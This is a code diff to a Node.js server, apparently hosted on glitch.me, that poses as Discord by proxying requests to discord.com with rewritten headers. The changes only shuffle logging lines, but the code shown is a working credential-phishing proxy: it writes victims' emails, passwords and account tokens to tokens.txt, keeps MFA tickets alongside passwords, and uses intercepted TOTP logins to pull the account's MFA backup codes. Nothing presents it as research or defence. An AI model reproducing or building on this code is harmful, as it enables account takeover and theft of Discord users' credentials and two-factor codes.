@@ -36,7 +36,7 @@ if(headers['content-type']) headersNew['content-type'] = headers['content-type']
 // if(headersNew.authorization) headersNew.authorization = "Bot " + headersNew.authorization
  if(headersNew.referer) headersNew.referer = `${headersNew.referer}`.replace('https://scalloped-mahogany-chronometer.glitch.me/', 'https://discord.com/')
  if(headersNew.origin) headersNew.origin = `https://discord.com/`
-  console.log('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7'))
+ console.log(req.body)
   if(JSON.stringify(req.body) !== `{}`){
   let dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method, headers: headersNew, body: JSON.stringify(req.body)}).catch(err =>{})
   if(!dataFetch) dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method, body: JSON.stringify(req.body)}).catch(err =>{})
@@ -46,7 +46,6 @@ if(headers['content-type']) headersNew['content-type'] = headers['content-type']
   try {
   
     let s = JSON.parse(dataText)
-    console.log(s)
     if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/users/@me` && s.token){
 
     	let tokens;
@@ -66,6 +65,8 @@ if(!arr.includes(s.email)) arr.unshift(`${s.email}:${s.token}`)
 return res.status(dataFetch.status).send(dataText)
 }
         }else{
+              console.log('https://discord.com' + req.originalUrl)
+
           if('https://discord.com' + req.originalUrl === "https://discord.com/api/v6/experiments") headersNew = {}
           headersNew.host = "discord.com"
   let dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method, headers: headersNew}).catch(err =>{})
@@ -75,7 +76,6 @@ return res.status(dataFetch.status).send(dataText)
   try {
   
     let s = JSON.parse(dataText)
-    console.log(s)
 if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/users/@me` && s.token){
 
     	let tokens;
@@ -89,6 +89,7 @@ if(!arr.includes(s.email)) arr.unshift(`${s.email}:${s.token}`)
 	fs.writeFileSync("./tokens.txt", arr.join("\n"));
 }
 if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/login`){
+  console.log(s)
 if(s.mfa) data.unshift({ticket: s.ticket, password: req.body.password})
 }
     if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/login` && s.token){
@@ -105,6 +106,7 @@ if(!arr.includes(req.body.login)) arr.unshift(`${req.body.login}:${req.body.pass
 }
 if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/mfa/totp`){
 var f = data.find(c => c.ticket === req.body.ticket)
+console.log(f)
 if(f){
   let dF = await fetch(('https://discord.com/api/v9/users/@me/mfa/codes'), {
 headers: {
